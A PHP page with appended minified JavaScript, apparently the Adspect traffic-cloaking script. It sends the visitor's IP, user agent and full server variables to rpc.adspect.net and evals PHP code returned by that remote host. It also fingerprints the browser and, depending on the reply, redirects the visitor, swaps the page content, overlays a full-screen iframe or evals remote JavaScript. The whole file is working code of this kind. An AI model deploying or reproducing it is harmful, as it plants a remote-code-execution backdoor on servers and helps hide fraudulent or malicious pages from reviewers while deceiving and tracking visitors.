<?php
ini_set('display_errors','0');error_reporting(E_ALL);if(!function_exists('adspect')){function adspect_exit($code,$message){http_response_code($code);exit($message);}function adspect_dig($array,$key,$default=''){return array_key_exists($key,$array)?$array[$key]:$default;}function adspect_curl($url,$options){$curl=curl_init();curl_setopt_array($curl,[CURLOPT_URL=>$url,CURLOPT_CONNECTTIMEOUT=>60,CURLOPT_TIMEOUT=>60,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_SSL_VERIFYPEER=>0,]);if(!empty($options)){curl_setopt_array($curl,$options);}$content=curl_exec($curl);$errno=curl_errno($curl);if($errno){adspect_exit(500,'curl error: '.curl_strerror($errno));}$code=curl_getinfo($curl,CURLINFO_HTTP_CODE);$type=curl_getinfo($curl,CURLINFO_CONTENT_TYPE);curl_close($curl);return[$code,$content,$type];}function adspect_rpc_url($sid){$sid=adspect_dig($_GET,'__sid',$sid);$query=adspect_dig($_SERVER,'QUERY_STRING');return"https://rpc.adspect.net/v2/$sid?$query";}function adspect_client_ip($keys){foreach($keys as$key){if(isset($_SERVER[$key])){$ip=$_SERVER[$key];if(is_string($ip)){switch($key){case'HTTP_X_FORWARDED_FOR':case'HTTP_FORWARDED_FOR':if(!preg_match('{([^,\s]+)\s*$}',$ip,$m)){break;}$ip=$m[1];default:if(filter_var($ip,FILTER_VALIDATE_IP)){return$ip;}break;}}}}adspect_exit(500,'Client IP address not available');}function adspect_rpc_headers(){$ip=adspect_client_ip(['HTTP_CF_CONNECTING_IP','HTTP_TRUE_CLIENT_IP','HTTP_FASTLY_CLIENT_IP','HTTP_X_ENVOY_EXTERNAL_ADDRESS','HTTP_X_CLIENT_IP','HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','HTTP_REAL_IP','HTTP_FORWARDED_FOR','REMOTE_ADDR',]);$ua=adspect_dig($_SERVER,'HTTP_USER_AGENT');return['User-Agent:',"Adspect-IP: $ip","Adspect-UA: $ua",];}function adspect_rpc_data(){$data=[];if($_SERVER['REQUEST_METHOD']==='POST'){if(!isset($_POST['data'])){adspect_exit(500,'Missing POST data');}$data=json_decode($_POST['data'],true);if(!is_array($data)){adspect_exit(500,'Invalid POST data');}}$data['server']=$_SERVER;return json_encode($data);}function adspect_rpc($sid){list($code,$json)=adspect_curl(adspect_rpc_url($sid),[CURLOPT_HTTPHEADER=>adspect_rpc_headers(),CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>adspect_rpc_data(),CURLOPT_RETURNTRANSFER=>true,]);if($code!==200){adspect_exit(500,"RPC error $code");}$data=json_decode($json,true);if(!isset($data['ok'],$data['js'],$data['cid'],$data['action'],$data['target'])){adspect_exit(500,'Invalid RPC response');}return[$data,$json];}function adspect_execute(){eval(func_get_arg(0));}function adspect($sid){header('Access-Control-Allow-Origin: *');header('Cache-Control: no-store');if(!function_exists('curl_init')){adspect_exit(500,'php-curl extension is missing');}if(!function_exists('json_encode')||!function_exists('json_decode')){adspect_exit(500,'php-json extension is missing');}list($data,$json)=adspect_rpc($sid);global$_adspect;$_adspect=$data;extract($data);if(isset($e)){eval($e);}if(!$ok&&!$js){exit;}if($action==='php'){ob_start();adspect_execute($target);$data['target']=ob_get_clean();$json=json_encode($data);}if($_SERVER['REQUEST_METHOD']==='POST'){header('Content-Type: application/json');exit($json);}header('Content-Type: application/javascript');echo"window._adata=$json;";}}adspect('c8c1920e-1d9c-449e-a174-3a1ea60a37d2');?>
(function(u,y,v,e,n,z,A,w){var q={},k={mode:"ajax",errors:q};function x(a){if(a.ok)switch(a.action){case "local":case "fetch":case "proxy":var b=new XMLHttpRequest;b.open("GET",a.target,!1);b.onreadystatechange=function(){4===this.readyState&&200===this.status&&(e.open(),e.write(this.responseText),e.close())};b.send();break;case "301":case "302":case "303":case "307":case "308":case "refresh":case "meta":case "replace":case "xar":case "xsf":n.replace(a.target);break;case "assign":n.assign(a.target);
break;case "top":top.location=a.target;break;case "form":b=e.createElement("form");b.method="GET";b.action=a.target;e.body.appendChild(b);b.submit();break;case "iframe":b=e.createElement("iframe"),b.style.cssText="width:100%;height:100%;position:absolute;top:0;left:0;z-index:1000;border:none;",b.src=a.target,a.target=b.outerHTML;case "php":e.open();e.write(a.target);e.close();break;case "js":eval(a.target)}}var r=w._adata;if(!r.js)return x(r);try{function a(d,c){try{k[d]=c()}catch(g){q[d]=g.name}}
function b(d,c){a(d,function(){function g(p){try{var h=c[p];switch(typeof h){case "object":null!==h&&(h=h.toString());break;case "function":h=y.prototype.toString.call(h)}f[p]=h}catch(B){q[d+"."+p]=B.name}}var f={},l;for(l in c)g(l);try{var t=u.getOwnPropertyNames(c);for(l=0;l<t.length;++l)g(t[l]);f["!!"]=t}catch(p){}return f})}b("console",v);b("document",e);(function(d,c){a(d,function(){var g={};c=c.attributes;for(var f in c)f=c[f],g[f.nodeName]=f.nodeValue;return g})})("documentElement",e.documentElement);
b("location",n);b("navigator",z);b("window",w);b("screen",A);a("timezoneOffset",function(){return(new Date).getTimezoneOffset()});a("closure",function(){return function(){}.toString()});k.frame=!0;a("frame",function(){k.frame=self!==top});a("touchEvent",function(){return u.prototype.toString.call(e.createEvent("TouchEvent"))});a("tostring",function(){function d(){}var c=0;d.toString=function(){++c;return""};v.log(d);return c});a("webgl",function(){var d=e.createElement("canvas").getContext("webgl"),
c=d.getExtension("WEBGL_debug_renderer_info");return{vendor:d.getParameter(c.UNMASKED_VENDOR_WEBGL),renderer:d.getParameter(c.UNMASKED_RENDERER_WEBGL)}});function m(d,c,g){var f=d.prototype[c];d.prototype[c]=function(){k.proto=!0};g();d.prototype[c]=f}try{m(Array,"includes",function(){return e.createElement("video").canPlayType("video/mp4")})}catch(d){}}catch(a){}(function(){var a=e.getElementById(btoa(n.origin));if(a){k.cid=r.cid;var b=new FormData;b.append("data",JSON.stringify(k));var m=new XMLHttpRequest;
m.open("POST",a.getAttribute("src"),!1);m.onreadystatechange=function(){4===this.readyState&&200===this.status&&x(JSON.parse(this.responseText))};m.send(b)}})()})(Object,Function,console,document,location,navigator,screen,window);
<?php exit;
